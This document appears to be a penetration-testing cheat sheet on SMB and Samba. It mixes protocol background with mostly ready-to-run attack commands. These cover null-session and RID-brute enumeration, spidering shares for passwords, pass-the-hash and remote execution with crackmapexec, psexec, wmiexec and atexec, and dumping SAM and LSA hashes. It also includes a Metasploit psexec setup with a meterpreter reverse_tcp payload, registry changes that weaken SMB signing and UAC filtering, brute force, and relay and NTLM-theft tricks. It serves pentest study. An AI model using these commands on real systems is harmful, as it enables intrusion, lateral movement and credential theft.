## SMB

The **Server Message Block (SMB)** protocol, operating in a **client-server** model, is designed for regulating **access to files**, directories, and other network resources like printers and routers. Primarily utilized within the **Windows** operating system series, SMB ensures backward compatibility, allowing devices with newer versions of Microsoft's operating system to seamlessly interact with those running older versions. Additionally, the **Samba** project offers a free software solution, enabling SMB's implementation on **Linux** and Unix systems, thereby facilitating cross-platform communication through SMB.

Shares, representing **arbitrary parts of the local file system**, can be provided by an SMB server, making the hierarchy visible to a client partly **independent** from the server's actual structure. The **Access Control Lists (ACLs)**, which define **access rights**, allow for **fine-grained control** over user permissions, including attributes like **`execute`**, **`read`**, and **`full access`**. These permissions can be assigned to individual users or groups, based on the shares, and are distinct from the local permissions set on the server.

>port**139** The _**Network Basic Input Output System**_**(NetBIOS)** is a software protocol designed to enable applications, PCs, and Desktops within a local area network (LAN) to interact with network hardware and **facilitate the transmission of data across the network**. The identification and location of software applications operating on a NetBIOS network are achieved through their NetBIOS names, which can be up to 16 characters in length and are often distinct from the computer name. A NetBIOS session between two applications is initiated when one application (acting as the client) issues a command to "call" another application (acting as the server) utilizing **TCP Port 139**.

```
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
```

 >Port ***445*** Technically, Port 139 is referred to as ‚ÄòNBT over IP‚Äô, whereas Port 445 is identified as ‚ÄòSMB over IP‚Äô. The acronym **SMB** stands for ‚Äò**Server Message Blocks**‚Äô, which is also modernly known as the **Common Internet File System (CIFS)**. As an application-layer network protocol, SMB/CIFS is primarily utilized to enable shared access to files, printers, serial ports, and facilitate various forms of communication between nodes on a network. For example, in the context of Windows, it is highlighted that SMB can operate directly over TCP/IP, eliminating the necessity for NetBIOS over TCP/IP, through the utilization of port 445. Conversely, on different systems, the employment of port 139 is observed, indicating that SMB is being executed in conjunction with NetBIOS over TCP/IP.

```
445/tcp   open  microsoft-ds  Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
```

---
`CIFS` is considered a specific version of the SMB protocol, primarily aligning with `SMB version 1`. When SMB commands are transmitted over Samba to an older NetBIOS service, connections typically occur over TCP ports `137`, `138`, and `139`. In contrast, CIFS operates over TCP port `445` exclusively. There are several versions of SMB, including newer versions like `SMB 2` and `SMB 3`, which offer improvements and are preferred in modern infrastructures, while older versions like `SMB 1` (`CIFS`) are considered outdated but may still be used in specific environments.
### Samba
is an alternative implementation of the SMB server called Samba, which is developed for Unix-based operating systems. Samba implements the Common Internet File System (`CIFS`) network protocol. [CIFS](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-cifs/934c2faa-54af-4526-ac74-6a24d126724e) is a dialect of SMB, meaning it is a specific implementation of the SMB protocol originally created by Microsoft. This allows Samba to communicate effectively with newer Windows systems. Therefore, it is often referred to as SMB/CIFS

Samba is an alternative to the SMB server, made for Unix-based systems like Linux. It uses the CIFS (Common Internet File System) protocol, which is just a version of SMB created by Microsoft. This allows Samba to talk to Windows systems easily, so you may see it called SMB/CIFS.

CIFS mainly matches SMB version 1 and works over TCP port 445. Older SMB traffic using NetBIOS goes through ports 137, 138, and 139. SMB has several versions:
- CIFS: Used by Windows NT 4.0 ‚Äì uses NetBIOS
- SMB 1.0: Windows 2000 ‚Äì uses TCP directly
- SMB 2.0: Windows Vista/Server 2008 ‚Äì better speed and security
- SMB 2.1: Windows 7/Server 2008 R2 ‚Äì supports file locking
- SMB 3.0: Windows 8/Server 2012 ‚Äì adds encryption and multichannel
- SMB 3.0.2: Windows 8.1/Server 2012 R2
- SMB 3.1.1: Windows 10/Server 2016 ‚Äì supports AES-128 encryption and integrity checks

Starting from version 3, Samba can join Active Directory domains. From version 4, Samba can even act as a full AD domain controller. Samba runs background services (called daemons):
- `smbd`: Handles file sharing and printing
- `nmbd`: Manages NetBIOS name services

Samba works well on both Linux and Windows networks. Computers on the same SMB network are grouped in a "workgroup". A workgroup is just a name shared by devices on the network.

NetBIOS is an old system made by IBM to let computers talk to each other. When a machine joins the network, it registers a name. This can happen directly or through a NetBIOS Name Server (NBNS). Microsoft later improved NBNS and called it WINS (Windows Internet Name Service).

#### Default Configuration
```bash
[sharename]                  # The name of the network share.
workgroup = WORKGROUP        # Workgroup or domain name visible to clients when querying.
path = /path/here/           # The directory path that will be shared with the user.
server string = STRING       # Description string that appears when clients connect.
unix password sync = yes     # Synchronize the UNIX password with the SMB password.
usershare allow guests = yes # Allow guest (non-authenticated) users to access the share.
map to guest = bad user      # Map unknown or invalid users to the guest account.
browseable = yes             # Make the share visible in the list of available shares.
guest ok = yes               # Allow guests to connect without a password.
read only = yes              # Restrict users to read-only access.
create mask = 0700           # Set default permissions for newly created files.

```
##### dangerous config 
```bash
browseable = yes              # Allow listing available shares in the current share.
read only = no                # Allow creation and modification of files (not read-only).
writable = yes                # Allow users to create and modify files.
guest ok = yes                # Allow connecting to the service without using a password.
enable privileges = yes       # Honor privileges assigned to specific SID.
create mask = 0777            # Permissions for newly created files.
directory mask = 0777         # Permissions for newly created directories.
logon script = script.sh      # Script to be executed on user's login.
magic script = script.sh      # Script to be executed when it gets closed.
magic output = script.out     # File to store the output of the magic script.
```
### IPC$ Share

Access to the IPC$ share can be obtained through an anonymous null session, allowing for interaction with services exposed via named pipes. The utility `enum4linux` is useful for this purpose. Utilized properly, it enables the acquisition of:

* Information on the operating system
* Details on the parent domain
* A compilation of local users and groups
* Information on available SMB shares
* The effective system security policy

This functionality is critical for network administrators and security professionals to assess the security posture of SMB (Server Message Block) services on a network. `enum4linux` provides a comprehensive view of the target system's SMB environment, which is essential for identifying potential vulnerabilities and ensuring that the SMB services are properly secured.

```bash
enum4linux -a target_ip
```

The above command is an example of how `enum4linux` might be used to perform a full enumeration against a target specified by `target_ip`.

#### What is NTLM

If you don't know what is NTLM or you want to know how it works and how to abuse it, you will find very interesting this page about **NTLM** where is explained **how this protocol works and how you can take advantage of it:**

## **Server Enumeration**

### **Scan** a network searching for hosts:

```bash
nbtscan -r 192.168.0.1/24
```

### SMB server version

To look for possible exploits to the SMB version it important to know which version is being used. If this information does not appear in other used tools, you can:
```bash
sudo nmap 10.129.14.128 -sV -sC -p139,445
```


* Use the **MSF** auxiliary module \_**auxiliary/scanner/smb/smb\_version**
* Or this script:

```bash
#!/bin/sh
#Author: rewardone
#Description:
# Requires root or enough permissions to use tcpdump
# Will listen for the first 7 packets of a null login
# and grab the SMB Version
#Notes:
# Will sometimes not capture or will print multiple
# lines. May need to run a second time for success.
if [ -z $1 ]; then echo "Usage: ./smbver.sh RHOST {RPORT}" && exit; else rhost=$1; fi
if [ ! -z $2 ]; then rport=$2; else rport=139; fi
tcpdump -s0 -n -i tap0 src $rhost and port $rport -A -c 7 2>/dev/null | grep -i "samba\|s.a.m" | tr -d '.' | grep -oP 'UnixSamba.*[0-9a-z]' | tr -d '\n' & echo -n "$rhost: " &
echo "exit" | smbclient -L $rhost 1>/dev/null 2>/dev/null
echo "" && sleep .1
```

### **Search exploit**

```bash
msf> search type:exploit platform:windows target:2008 smb
searchsploit microsoft smb
```

### **Possible** Credentials

| **Username(s)**      | **Common passwords**                      |

### SMB Environment Information

### Obtain Information
#### RPCclient
The [Remote Procedure Call](https://www.geeksforgeeks.org/remote-procedure-call-rpc-in-operating-system/) (`RPC`) is a concept and, therefore, also a central tool to realize operational and work-sharing structures in networks and client-server architectures. The communication process via RPC includes passing parameters and the return of a function value.



```bash
#Dump interesting information
enum4linux -a [-u "<username>" -p "<passwd>"] <IP>
enum4linux-ng -A [-u "<username>" -p "<passwd>"] <IP>

/usr/share/doc/python3-impacket/examples/rpcdump.py -port 445 [[domain/]username[:password]@]<targetName or address>
```

### Enumerate Users, Groups & Logged On Users

This info should already being gathered from enum4linux and enum4linux-ng

```bash
crackmapexec smb 10.10.10.10 --users [-u <username> -p <password>]
crackmapexec smb 10.10.10.10 --groups [-u <username> -p <password>]
crackmapexec smb 10.10.10.10 --groups --loggedon-users [-u <username> -p <password>]

ldapsearch -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "(&(objectclass=user))" -h 10.10.10.10 | grep -i samaccountname: | cut -f 2 -d " "

rpcclient -U "" -N 10.10.10.10
enumdomusers
enumdomgroups
```

### Enumerate local users
```bash
rpcclient -U "" -N <IP> #No creds
enumdomusers #-> user:[mrb3n] rid:[0x3e8]
queryuser 0x3e8 #-> enum user by RID 
```
However, it can also happen that not all commands are available to us, and we have certain restrictions based on the user. However, the query `queryuser <RID>` is mostly allowed based on the RID. So we can use the rpcclient to brute force the RIDs to get information. Because we may not know who has been assigned which RID, we know that we will get information about it as soon as we query an assigned RID. There are several ways and tools we can use for this.
a Python script from [Impacket](https://github.com/SecureAuthCorp/impacket) called [samrdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/samrdump.py).

[Impacket](https://github.com/fortra/impacket/blob/master/examples/lookupsid.py)

```bash
lookupsid.py -no-pass hostname.local
```

Oneliner

```bash
for i in $(seq 500 1100);do rpcclient -N -U "" 10.10.10.10 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
```

## Shared Folders Enumeration

### List shared folders

It is always recommended to look if you can access to anything, if you don't have credentials try using **null** **credentials/guest user**.

```bash
smbclient --no-pass -L //<IP> # Null user 
smbclient -U username[%passwd] -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash

smbmap -H <IP> [-P <PORT>] #Null user
smbmap -u "username" -p "password" -H <IP> [-P <PORT>] #Creds
smbmap -u "username" -p "<NT>:<LM>" -H <IP> [-P <PORT>] #Pass-the-Hash
smbmap -R -u "username" -p "password" -H <IP> [-P <PORT>] #Recursive list

crackmapexec smb <IP> -u '' -p '' --shares #Null user
crackmapexec smb <IP> -u 'username' -p 'password' --shares #Guest user
crackmapexec smb <IP> -u 'username' -H '<HASH>' --shares #Guest user
```

### **Connect/List a shared folder**

```bash
#Connect using smbclient

smbclient -U bob \\\\10.129.42.253\\users # connect to windows
smbclient -U bob \\\\10.129.42.253\\users # connect to windows (null)
smbclient -U kali //10.129.42.253/users # connect to linux
smbclient --no-pass //<IP>/<Folder> # connect to linux (null)
smbclient -U username[%passwd] -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash
#Use --no-pass -c 'recurse;ls'  to list recursively with smbclient

#List with smbmap, without folder it list everything
smbmap [-u "username" -p "password"] -R [Folder] -H <IP> [-P <PORT>] # Recursive list
smbmap [-u "username" -p "password"] -r [Folder] -H <IP> [-P <PORT>] # Non-Recursive list
smbmap -u "username" -p "<NT>:<LM>" [-r/-R] [Folder] -H <IP> [-P <PORT>] #Pass-the-Hash
```

### **Manually enumerate windows shares and connect to them**

It may be possible that you are restricted to display any shares of the host machine and when you try to list them it appears as if there aren't any shares to connect to. Thus it might be worth a short to try to manually connect to a share. To enumerate the shares manually you might want to look for responses like NT\_STATUS\_ACCESS\_DENIED and NT\_STATUS\_BAD\_NETWORK\_NAME, when using a valid session (e.g. null session or valid credentials). These may indicate whether the share exists and you do not have access to it or the share does not exist at all.

Common share names for windows targets are

* C$
* D$
* ADMIN$
* IPC$
* PRINT$
* FAX$
* SYSVOL
* NETLOGON

(Common share names from _**Network Security Assessment 3rd edition**_)

You can try to connect to them by using the following command

```bash
smbclient -U '%' -N \\\\<IP>\\<SHARE> # null session to connect to a windows share
smbclient -U '<USER>' \\\\<IP>\\<SHARE> # authenticated session to connect to a windows share (you will be prompted for a password)
```

or this script (using a null session)

```bash
#/bin/bash

ip='<TARGET-IP-HERE>'
shares=('C$' 'D$' 'ADMIN$' 'IPC$' 'PRINT$' 'FAX$' 'SYSVOL' 'NETLOGON')

for share in ${shares[*]}; do
    output=$(smbclient -U '%' -N \\\\$ip\\$share -c '') 

    if [[ -z $output ]]; then 
        echo "[+] creating a null session is possible for $share" # no output if command goes through, thus assuming that a session was created
    else
        echo $output # echo error message (e.g. NT_STATUS_ACCESS_DENIED or NT_STATUS_BAD_NETWORK_NAME)
    fi
done
```

examples

```bash
smbclient -U '%' -N \\\\192.168.0.24\\im_clearly_not_here # returns NT_STATUS_BAD_NETWORK_NAME
smbclient -U '%' -N \\\\192.168.0.24\\ADMIN$ # returns NT_STATUS_ACCESS_DENIED or even gives you a session
```

### **Enumerate shares from Windows / without third-party tools**

PowerShell

```powershell
# Retrieves the SMB shares on the locale computer.
Get-SmbShare
Get-WmiObject -Class Win32_Share
# Retrieves the SMB shares on a remote computer.
get-smbshare -CimSession "<computer name or session object>"
# Retrieves the connections established from the local SMB client to the SMB servers.
Get-SmbConnection
```

CMD console

```shell
# List shares on the local computer
net share
# List shares on a remote computer (including hidden ones)
net view \\<ip> /all
```

MMC Snap-in (graphical)

```shell
# Shared Folders: Shared Folders > Shares
fsmgmt.msc
# Computer Management: Computer Management > System Tools > Shared Folders > Shares
compmgmt.msc
```

explorer.exe (graphical), enter `\\<ip>\` to see the available non-hidden shares.

### Mount a shared folder

```bash
mount -t cifs //x.x.x.x/share /mnt/share
mount -t cifs -o "username=user,password=password" //x.x.x.x/share /mnt/share
```

### **Download files**

Read previous sections to learn how to connect with credentials/Pass-the-Hash.

```bash
get flag.txt  # smbclient 

#Search a file and download
sudo smbmap -R Folder -H <IP> -A <FileName> -q # Search the file in recursive mode and download it inside /usr/share/smbmap
```

```bash
#Download all
smbclient //<IP>/<share>
> mask ""
> recurse
> prompt
> mget *
#Download everything to current directory
```

Commands:

* mask: specifies the mask which is used to filter the files within the directory (e.g. "" for all files)
* recurse: toggles recursion on (default: off)
* prompt: toggles prompting for filenames off (default: on)
* mget: copies all files matching the mask from host to client machine

(_Information from the manpage of smbclient_)

### Domain Shared Folders Search

* [**Snaffler**](https://github.com/SnaffCon/Snaffler)

```bash
Snaffler.exe -s -d domain.local -o snaffler.log -v data
```

* [**CrackMapExec**](https://wiki.porchetta.industries/smb-protocol/spidering-shares) spider.
  * `-M spider_plus [--share <share_name>]`
  * `--pattern txt`

```bash
sudo crackmapexec smb 10.10.10.10 -u username -p pass -M spider_plus --share 'Department Shares'
```

Specially interesting from shares are the files called **`Registry.xml`** as they **may contain passwords** for users configured with **autologon** via Group Policy. Or **`web.config`** files as they contains credentials.

{% hint style="info" %}
The **SYSVOL share** is **readable** by all authenticated users in the domain. In there you may **find** many different batch, VBScript, and PowerShell **scripts**.\
You should **check** the **scripts** inside of it as you might **find** sensitive info such as **passwords**.
{% endhint %}

## Read Registry

You may be able to **read the registry** using some discovered credentials. Impacket **`reg.py`** allows you to try:

```bash
sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKU -s
sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKCU -s
sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKLM -s
```

## Post Exploitation

The **default config of** a **Samba** server is usually located in `/etc/samba/smb.conf` and might have some **dangerous configs**:

| **Setting**                 | **Description**                                                     |
| --------------------------- | ------------------------------------------------------------------- |
| `browseable = yes`          | Allow listing available shares in the current share?                |
| `read only = no`            | Forbid the creation and modification of files?                      |
| `writable = yes`            | Allow users to create and modify files?                             |
| `guest ok = yes`            | Allow connecting to the service without using a password?           |
| `enable privileges = yes`   | Honor privileges assigned to specific SID?                          |
| `create mask = 0777`        | What permissions must be assigned to the newly created files?       |
| `directory mask = 0777`     | What permissions must be assigned to the newly created directories? |
| `logon script = script.sh`  | What script needs to be executed on the user's login?               |
| `magic script = script.sh`  | Which script should be executed when the script gets closed?        |
| `magic output = script.out` | Where the output of the magic script needs to be stored?            |

The command `smbstatus` gives information about the **server** and about **who is connected**.

## Authenticate using Kerberos

You can **authenticate** to **kerberos** using the tools **smbclient** and **rpcclient**:

```bash
smbclient --kerberos //ws01win10.domain.com/C$
rpcclient -k ws01win10.domain.com
```

crackmapexec can execute commands **abusing** any of **mmcexec, smbexec, atexec, wmiexec** being **wmiexec** the **default** method. You can indicate which option you prefer to use with the parameter `--exec-method`:

```bash
apt-get install crackmapexec

crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable' #Execute Powershell
crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami #Excute cmd
crackmapexec smb 192.168.10.11 -u Administrator -H <NTHASH> -x whoami #Pass-the-Hash
# Using --exec-method {mmcexec,smbexec,atexec,wmiexec}

crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --sam #Dump SAM
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --lsa #Dump LSASS in memmory hashes
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --sessions #Get sessions (
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --loggedon-users #Get logged-on users
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --disks #Enumerate the disks
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --users #Enumerate users
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --groups # Enumerate groups
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --local-groups # Enumerate local groups
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --pass-pol #Get password policy
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --rid-brute #RID brute

crackmapexec smb <IP> -d <DOMAIN> -u Administrator -H <HASH> #Pass-The-Hash
```

### [**psexec**](../../windows-hardening/lateral-movement/psexec-and-winexec.md)**/**[**smbexec**](../../windows-hardening/lateral-movement/smbexec.md) (**administrator  / system user privileges** are usually required)

>**admin / system user privileges** are usually required

Both options will **create a new service** (using _\pipe\svcctl_ via SMB) in the victim machine and use it to **execute something** (**psexec** will **upload** an executable file to ADMIN$ share and **smbexec** will point to **cmd.exe/powershell.exe** and put in the arguments the payload --**file-less technique-**-).\
**More info** about [**psexec** ](../../windows-hardening/lateral-movement/psexec-and-winexec.md)and [**smbexec**](../../windows-hardening/lateral-movement/smbexec.md).\
In **kali** it is located on /usr/share/doc/python3-impacket/examples/

```bash
#If no password is provided, it will be prompted
./psexec.py [[domain/]username[:password]@]<targetName or address>
./psexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash
psexec \\192.168.122.66 -u Administrator -p 123456Ww
psexec \\192.168.122.66 -u Administrator -p q23q34t34twd3w34t34wtw34t # Use pass the hash

# or using metasploit
use exploit/windows/smb/psexec
set RHOSTS <target_ip>
set SMBUser <username>
set SMBPass <ntlm_hash>
set SMBPass NT <NTLM_hash> (if only the NTLM hash is used)
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <your_ip>
run
```

Using **parameter**`-k` you can authenticate against **kerberos** instead of **NTLM**


 **Correct Handling of Access Denied (Command=117)**
 
>When trying to use Pass-the-Hash for SMB using user in administrator group and encountering access issues with the error message similar to **"command=117"**, this is typically related to SMB security settings that require a certain level of signing or prevent privileged access over the network.

 **Solution: Modifying the Required Registry Settings**

To resolve this, you need to modify two key registry values to allow the administrative hash to work properly over SMB and avoid issues like **Access Denied**.

1. **Registry Key 1: `LocalAccountTokenFilterPolicy`**

   This key allows local administrative users to authenticate over the network without User Account Control (UAC) interference.

   **PowerShell Command:**
   ```powershell
   New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "LocalAccountTokenFilterPolicy" -Value 1 -PropertyType DWord -Force
   ```

2. **Registry Key 2: `RequireSecuritySignature`**

   This setting forces SMB to use message signing, which can prevent certain operations, like Pass-the-Hash attacks, if enabled. Disabling it can help overcome the "Access Denied" issue.

   You need to create a new `DWORD (32-bit)` value named `RequireSecuritySignature` and set it to `0` under the `LanmanServer` settings.

   **PowerShell Command:**
   ```powershell
   New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "RequireSecuritySignature" -Value 0 -PropertyType DWord -Force
   ```

### [wmiexec](../../windows-hardening/lateral-movement/wmiexec.md)/dcomexec

Stealthily execute a command shell without touching the disk or running a new service using DCOM via **port 135.**\
In **kali** it is located on /usr/share/doc/python3-impacket/examples/

```bash
#If no password is provided, it will be prompted
./wmiexec.py [[domain/]username[:password]@]<targetName or address> #Prompt for password
./wmiexec.py -hashes LM:NT administrator@10.10.10.103 #Pass-the-Hash
#You can append to the end of the command a CMD command to be executed, if you dont do that a semi-interactive shell will be prompted
```

Using **parameter**`-k` you can authenticate against **kerberos** instead of **NTLM**

```bash
#If no password is provided, it will be prompted
./dcomexec.py [[domain/]username[:password]@]<targetName or address>
./dcomexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash
#You can append to the end of the command a CMD command to be executed, if you dont do that a semi-interactive shell will be prompted
```

### [AtExec](../../windows-hardening/lateral-movement/atexec.md)

Execute commands via the Task Scheduler (using _\pipe\atsvc_ via SMB).\
In **kali** it is located on /usr/share/doc/python3-impacket/examples/

```bash
./atexec.py [[domain/]username[:password]@]<targetName or address> "command"
./atexec.py -hashes <LM:NT> administrator@10.10.10.175 "whoami"
```

## **Bruteforce users credentials**

**This is not recommended, you could block an account if you exceed the maximum allowed tries**

```bash
nmap --script smb-brute -p 445 <IP>
ridenum.py <IP> 500 50000 /root/passwds.txt #Get usernames bruteforcing that rids and then try to bruteforce each user name
```

## SMB relay attack

This attack uses the Responder toolkit to **capture SMB authentication sessions** on an internal network, and **relays** them to a **target machine**. If the authentication **session is successful**, it will automatically drop you into a **system** **shell**.\
[**More information about this attack here.**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

## SMB-Trap

The Windows library URLMon.dll automatically try to authenticaticate to the host when a page tries to access some contect via SMB, for example: `img src="\\10.10.10.10\path\image.jpg"`

This happens with the functions:

* URLDownloadToFile
* URLDownloadToCache
* URLOpenStream
* URLOpenBlockingStream

Which are used by some browsers and tools (like Skype)

## NTLM Theft

Similar to SMB Trapping, planting malicious files onto a target system (via SMB, for example) can illicit an SMB authentication attempt, allowing the NetNTLMv2 hash to be intercepted with a tool such as Responder. The hash can then be cracked offline or used in an [SMB relay attack](./#smb-relay-attack).
